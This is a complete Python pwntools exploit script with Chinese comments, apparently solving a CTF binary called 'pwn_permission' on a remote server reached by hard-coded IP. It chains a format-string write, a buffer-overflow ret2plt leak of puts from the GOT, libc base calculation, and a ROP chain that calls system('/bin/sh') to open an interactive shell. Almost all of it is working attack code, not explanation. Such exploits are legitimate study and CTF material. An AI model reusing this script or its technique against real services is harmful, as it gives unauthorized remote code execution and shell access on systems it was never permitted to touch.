
from pwn import *
import time

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# ====== 已知准确的偏移 ======
PUTS_OFFSET = 0x6d1e0
SYSTEM_OFFSET = 0x41360
BINSH_OFFSET = 0x18c363

# ====== 完美的gadget！！！ ======
pop_ebx_esi_edi_ebp_ret = 0x08049380  # 完美！！！

# ====== 连接服务器 ======
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

# ====== Step 1: 用格式字符串设置target_val=5 ======
target_val_addr = 0x804c030
fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(2)

response = conn.recv(timeout=5)
if b'Input:' not in response:
    log.error("没触发vuln！")
    conn.close()
    exit(1)

log.success("vuln函数已触发！")

# ====== Step 2: 泄露puts地址 ======
write_plt = elf.plt['write']
puts_got = elf.got['puts']
vuln_addr = elf.symbols['vuln']

payload = b'A' * 148
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(puts_got)
payload += p32(4)

conn.send(payload)
time.sleep(2)

response = conn.recv(timeout=5)
puts_leak = u32(response[:4])
log.info(f"puts地址: 0x{puts_leak:x}")

# ====== Step 3: 计算libc地址 ======
libc_base = puts_leak - PUTS_OFFSET
system_addr = libc_base + SYSTEM_OFFSET
binsh_addr = libc_base + BINSH_OFFSET

log.info(f"libc基址: 0x{libc_base:x}")
log.info(f"system: 0x{system_addr:x}")
log.info(f"/bin/sh: 0x{binsh_addr:x}")

# ====== Step 4: 构造完美的ROP链！！！ ======
payload2 = b'A' * 148

# 首先设置ebx为GOT的地址（0x804c000），这样调用libc函数时就不会崩溃了！
payload2 += p32(pop_ebx_esi_edi_ebp_ret)
payload2 += p32(0x0804c000)  # ebx = GOT地址！完美！！！
payload2 += p32(0xdeadbeef)  # esi → 随意
payload2 += p32(0xdeadbeef)  # edi → 随意
payload2 += p32(0xdeadbeef)  # ebp → 随意

# 现在调用system！！！
payload2 += p32(system_addr)
payload2 += p32(vuln_addr)   # 返回地址
payload2 += p32(binsh_addr)  # /bin/sh

log.info("发送最终完美的payload...")
conn.send(payload2)
time.sleep(1)

# 尝试cat flag
log.info("进入交互模式！")
conn.interactive()

conn.close()
